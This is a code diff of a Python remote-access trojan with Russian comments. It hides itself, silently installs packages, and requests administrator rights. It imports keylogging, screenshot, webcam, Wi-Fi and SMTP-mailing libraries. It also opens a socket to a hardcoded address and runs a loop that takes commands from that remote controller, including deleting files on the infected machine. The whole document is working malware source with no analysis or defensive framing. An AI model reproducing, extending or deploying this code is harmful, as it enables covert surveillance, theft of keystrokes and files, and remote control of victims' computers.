@@ -1,39 +1,5 @@
+import getpass
 import os, time
-import datetime
-import pathlib
-
-from pynput.keyboard import Listener
-from pynput import keyboard
-import os, stat, shutil
-import keyboard
-import smtplib  # Импортируем библиотеку по работе с SMTP
-from email.mime.audio import MIMEAudio  # Аудио
-from email.mime.image import MIMEImage  # Изображения
-from email.mime.multipart import MIMEMultipart  # Многокомпонентный объект
-from email.mime.text import MIMEText  # Текст/HTML
-
-import socket, subprocess, mimetypes, requests, pyautogui
-from pywifi import *
-from requests import get
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-host = socket.getaddrinfo(socket.gethostname(), None)
-ipv4_addresses = [i[4][0] for i in host if i[0] == socket.AF_INET]
-# print(ipv4_addresses)
-ip = "192.168.27.99"
-reconect = False
-
-def admin():
-    #!!!#
-    import ctypes, sys
-
-    if not ctypes.windll.shell32.IsUserAnAdmin():
-        if __name__ == "__main__":
-            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
-        else:
-            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
-
-#admin()
 
 def h1de():
     try:
@@ -73,6 +39,53 @@ def h1de():
         pass
 
 h1de()
+
+os.system("pip install pynput")
+os.system("pip install keyboard")
+os.system("pip install pyautogui")
+os.system("pip install sockets")
+os.system("pip install comtypes")
+os.system("pip install pywifi")
+os.system("pip install requests")
+import datetime
+import pathlib
+
+from pynput.keyboard import Listener
+from pynput import keyboard
+import os, stat, shutil
+import keyboard
+import smtplib  # Импортируем библиотеку по работе с SMTP
+from email.mime.audio import MIMEAudio  # Аудио
+from email.mime.image import MIMEImage  # Изображения
+from email.mime.multipart import MIMEMultipart  # Многокомпонентный объект
+from email.mime.text import MIMEText  # Текст/HTML
+
+import socket, subprocess, mimetypes, requests, pyautogui
+from pywifi import *
+from requests import get
+import cv2
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+host = socket.getaddrinfo(socket.gethostname(), None)
+ipv4_addresses = [i[4][0] for i in host if i[0] == socket.AF_INET]
+# print(ipv4_addresses)
+ip = ""
+reconect = False
+
+def admin():
+    #!!!#
+    import ctypes, sys
+
+    if not ctypes.windll.shell32.IsUserAnAdmin():
+        if __name__ == "__main__":
+            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
+            exit(1)
+        else:
+            pass
+
+#admin()
+
+
 
 def wa1ting(ip="192.168.0.12", s=None, it=0):
     del s
@@ -1218,7 +1231,7 @@ def spy(cmd_dt):
 
 
 
-
+#s.send((getpass.getuser()).encode())
 s.send((subprocess.getoutput("cd")).encode())
 print(s.recv(1024).decode())
 while 1:
@@ -1272,8 +1285,13 @@ while 1:
             os.remove(pathr)
         elif "delete" == command.split(" ")[0]:
             if os.path.isfile((command.split(" "))[-1]):
-                pathlib.Path.unlink(os.path.abspath(str(command.split(" ")[-1])), missing_ok=True)
-                #os.remove((command.split(" "))[-1])
+                try:
+                    pathlib.Path.unlink(os.path.abspath((command.split(" ")[-1])), missing_ok=True)
+                except:
+                    try:
+                        os.remove((command.split(" "))[-1])
+                    except:
+                        pass
             else:
                 #shutil.rmtree(str(command.split(" ")[-1]))
                 """try:
